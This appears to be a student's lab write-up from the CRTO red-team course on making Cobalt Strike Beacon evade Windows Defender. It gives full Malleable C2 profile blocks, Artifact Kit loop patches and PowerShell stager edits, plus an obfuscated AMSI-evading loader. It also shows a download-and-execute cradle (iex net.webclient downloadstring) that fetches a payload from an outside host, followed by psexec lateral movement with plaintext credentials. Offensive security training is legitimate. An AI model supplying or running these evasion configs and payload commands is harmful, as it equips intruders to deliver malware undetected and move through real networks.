# CRTO — Defence Evasion Lab

**Course:** Red Team Ops (CRTO) by RastaMouse — Zero Point Security
**Lab:** Defence Evasion
**Objective:** Modify Cobalt Strike's artifacts, resources, and C2 profile to make Beacon resilient against Windows Defender

---

## Overview

Three layers of evasion are configured in this lab. Each targets a different detection surface:

| Component | What It Modifies | Detection Surface Targeted |
|---|---|---|
| Malleable C2 Profile | Beacon's in-memory signatures & post-ex behaviour | Memory scanning, behavioural detection |
| Artifact Kit | How payloads are built (EXE/DLL templates) | Static AV signatures on disk |
| Resource Kit | PowerShell stager templates | AMSI / script-based detection |

---

## Step 1 — Malleable C2 Profile

SSH into the team server and edit the profile:

```bash
ssh attacker@10.0.0.5     # password: Passw0rd!
cd /opt/cobaltstrike/profiles
nano default.profile
```

Three blocks are added. Each targets a specific detection surface.

---

### `stage` Block — In-Memory Beacon Evasion

```c
stage {
    set userwx "false";
    set cleanup "true";
    set copy_pe_header "false";
    set module_x64 "Hydrogen.dll";

    transform-x64 {
        strrep "beacon.x64.dll" "bacon.x64.dll";
        strrep "%02d/%02d/%02d" "%02d/%02d/%04d";
        strrep "%s as %s\\\\%s: %d" "%s - %s\\\\%s: %d";
        strrep "%02d/%02d/%02d %02d:%02d:%02d" "%02d-%02d-%02d %02d:%02d:%02d";
        strrep "\\x48\\x89..." "\\x48\\x89...";
    }
}
```

**What each setting does:**

| Setting | Purpose |
|---|---|
| `userwx "false"` | Don't allocate RWX memory — RWX is a major IOC for memory scanners |
| `cleanup "true"` | Free the reflective loader after injection to reduce memory footprint |
| `copy_pe_header "false"` | Don't copy the PE header into memory — reduces signature surface |
| `module_x64 "Hydrogen.dll"` | Load Beacon into memory carved from a legitimate DLL's address space (module stomping) |
| `strrep` directives | Patch known Beacon strings in-memory that AV/EDR vendors signature against |

> **Key concept — Module Stomping:** Instead of allocating fresh memory for Beacon, CS loads a legitimate DLL (`Hydrogen.dll`) and overwrites it with Beacon. Memory scanners see a legitimate DLL path rather than anonymous allocated memory.

---

### `post-ex` Block — Post-Exploitation Evasion

```c
post-ex {
    set spawnto_x64 "%windir%\\\\sysnative\\\\werfault.exe";
    set cleanup "true";
    set pipename "dotnet-diagnostic-#####, ########-####-####-####-############";
    set thread_hint "ntdll.dll!RtlUserThreadStart+0x2c";
    set amsi_disable "true";

    transform-x64 {
        strrep "This program cannot be run in DOS mode." "This is totally not a PE.";
        strrepex "PowerPick" "CLRCreateInstance failed w/hr 0x%08lx" "CLRCreateInstance failed: 0x%08lx";
        strrepex "ExecuteAssembly" "Invoke_3 on EntryPoint failed." "Unhandled exception.";
    }
}
```

**What each setting does:**

| Setting | Purpose |
|---|---|
| `spawnto_x64 "werfault.exe"` | Post-ex commands spawn into `werfault.exe` — a legitimate Windows error reporting process, less suspicious than `rundll32` |
| `cleanup "true"` | Clean up post-ex artifacts after execution |
| `pipename "dotnet-diagnostic-..."` | Named pipe name used for post-ex communication — mimics .NET diagnostic pipes |
| `thread_hint "ntdll.dll!RtlUserThreadStart+0x2c"` | Sets the thread's start address to a legitimate ntdll function — bypasses thread start address checks used by EDRs |
| `amsi_disable "true"` | Patch AMSI in the post-ex process before running PowerShell/assembly |
| `strrepex` directives | Patch known strings in PowerPick and ExecuteAssembly that AV vendors signature |

---

### `process-inject` Block — Injection Evasion

```c
process-inject {
    set allocator "VirtualAllocEx";
    set bof_allocator "VirtualAlloc";
    set bof_reuse_memory "true";
    set min_alloc "8192";
    set startrwx "false";
    set userwx "false";

    execute {
        CreateThread "ntdll.dll!RtlUserThreadStart+0x2c";
        NtQueueApcThread-s;
        NtQueueApcThread;
        SetThreadContext;
    }
}
```

**What each setting does:**

| Setting | Purpose |
|---|---|
| `startrwx "false"` | Don't start with RWX permissions — allocate RW, write shellcode, then change to RX |
| `userwx "false"` | Final memory permissions are RX not RWX — RWX at rest is a major EDR IOC |
| `bof_reuse_memory "true"` | Reuse allocated memory for BOF execution rather than allocating fresh each time |
| `execute` block | Ordered list of injection techniques CS tries — falls through to next if one fails |
| `thread_hint` on CreateThread | Spoofs thread start address to a legitimate ntdll location |

**Restart the team server after saving:**
```bash
sudo /usr/bin/docker restart cobaltstrike-cs-1

# If it fails to start, check profile syntax errors:
sudo /usr/bin/docker logs cobaltstrike-cs-1
```

---

## Step 2 — Artifact Kit

Modifies how CS builds EXE/DLL payload templates. The default templates are heavily signatured by AV vendors.

### Modify patch.c

```
C:\Tools\cobaltstrike\arsenal-kit\kits\artifact\src-common\patch.c
```

**Line ~45 — svc exe payload loop (XOR decryption, reverse order):**
```c
x = length;
while ( x-- ) {
  * ( ( char * ) buffer + x) = * ( ( char * ) buffer + x ) ^ key [ x % 8 ];
}
```

**Line ~116 — normal exe payload loop:**
```c
int x = length;
while ( x-- ) {
  * ( ( char * ) ptr + x ) = * ( ( char * ) buffer + x ) ^ key [ x % 8 ];
}
```

> **What this does:** Changes the XOR decryption loop from forward iteration to **reverse order**. AV vendors signature the default forward loop byte pattern. Reversing it breaks the static signature without changing the functional output.

### Build the Artifact Kit

From Ubuntu WSL:
```bash
cd /mnt/c/Tools/cobaltstrike/arsenal-kit/kits/artifact

./build.sh mailslot VirtualAlloc 351363 0 false false none /mnt/c/Tools/cobaltstrike/custom-artifacts
```

**Build argument breakdown:**

| Argument | Value | Meaning |
|---|---|---|
| Technique | `mailslot` | IPC method used for stager communication |
| Allocator | `VirtualAlloc` | Memory allocation method for shellcode |
| Size | `351363` | Allocation size |
| RDLL size | `0` | Reflective DLL size |
| Bypass | `false false` | AMSI/WLDP bypass flags |
| Output | `/mnt/c/Tools/cobaltstrike/custom-artifacts` | Output directory |

### Load in Cobalt Strike
```
Cobalt Strike > Script Manager > Load
C:\Tools\cobaltstrike\custom-artifacts\mailslot\artifact.cna
```

---

## Step 3 — Resource Kit

Modifies the PowerShell stager templates used when delivering payloads via scripted web delivery or PowerShell one-liners.

### Build the Resource Kit

```bash
cd /mnt/c/Tools/cobaltstrike/arsenal-kit/kits/resource
./build.sh /mnt/c/Tools/cobaltstrike/custom-resources
```

### Modify template.x64.ps1

```
C:\Tools\cobaltstrike\custom-resources\template.x64.ps1
```

**Line 5 — Break string concatenation to evade static AMSI signatures:**
```powershell
# Before
.Equals('System.dll')

# After
.Equals('Sys'+'tem.dll')
```

**Line 32 — Replace the memory write method:**
```powershell
$var_wpm = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (func_get_proc_address kernel32.dll WriteProcessMemory),
    (func_get_delegate_type @([IntPtr], [IntPtr], [Byte[]], [UInt32], [IntPtr]) ([Bool]))
)
$ok = $var_wpm.Invoke([IntPtr]::New(-1), $var_buffer, $v_code, $v_code.Count, [IntPtr]::Zero)
```

> **Why:** The default template uses a known pattern for resolving and calling `WriteProcessMemory`. Replacing it with a dynamic P/Invoke resolution breaks the AMSI signature.

### Modify compress.ps1 — Obfuscation

Replace with an obfuscated version to defeat AMSI script scanning:

```powershell
SET-itEm  VarIABLe:WyizE ([tyPe]('conVE'+'Rt') ) ;  seT-variAbLe  0eXs  (  [tYpe]('iO.'+'COmp'+'Re'+'S'+'SiON.C'+'oM'+'P'+'ResSIonM'+'oDE')) ; ${s}=nEW-o`Bj`eCt IO.`MemO`Ry`St`REAM(, (VAriABle wYIze -val  )::"FR`omB`AsE64s`TriNG"("%%DATA%%"));i`EX (ne`w-`o`BJECT i`o.sTr`EAmRe`ADEr(NEw-`O`BJe`CT IO.CO`mPrESSi`oN.`gzI`pS`Tream(${s}, ( vAriable  0ExS).vALUE::"Dec`om`Press")))."RE`AdT`OEnd"();
```

> For real engagements, generate a unique version with `Invoke-Obfuscation` rather than reusing this exact string — it will eventually get signatured.

### Load in Cobalt Strike
```
Cobalt Strike > Script Manager > Load
C:\Tools\cobaltstrike\custom-resources\resources.cna
```

---

## Step 4 — Testing the Full Chain

```powershell
# On attacker — host PowerShell payload
Attacks > Scripted Web Delivery > http listener > Launch

# On lon-wkstn-1 — execute payload
iex (new-object net.webclient).downloadstring("http://www.bleepincomputer.com/a")
```

Once Beacon checks in — chain into lateral movement:

```
# Impersonate local admin
make_token CONTOSO\rsteel Passw0rd!

# Set spawnto for service payload
ak-settings spawnto_x64 C:\Windows\System32\svchost.exe

# Move laterally via psexec
jump psexec64 lon-ws-1 smb
```

> **psexec64 vs scshell64:** Both use SMB. `psexec64` creates a new service; `scshell64` modifies an existing one. `scshell64` is stealthier — no new service creation event.

---

## Key Takeaways

- Defence evasion is configured **once at the start** of an engagement — get it right before you generate any payloads
- The three kits target different detection layers: C2 profile = memory/behaviour, Artifact Kit = static AV on disk, Resource Kit = AMSI/script scanning
- **Never use RWX memory** — `startrwx "false"` + `userwx "false"` is non-negotiable
- `werfault.exe` as spawnto is legitimate and rarely flagged — good default for post-ex
- On real engagements, regenerate unique obfuscation for `compress.ps1` with `Invoke-Obfuscation` — don't reuse the same string across engagements
- Always check team server logs after profile changes: `sudo /usr/bin/docker logs cobaltstrike-cs-1`
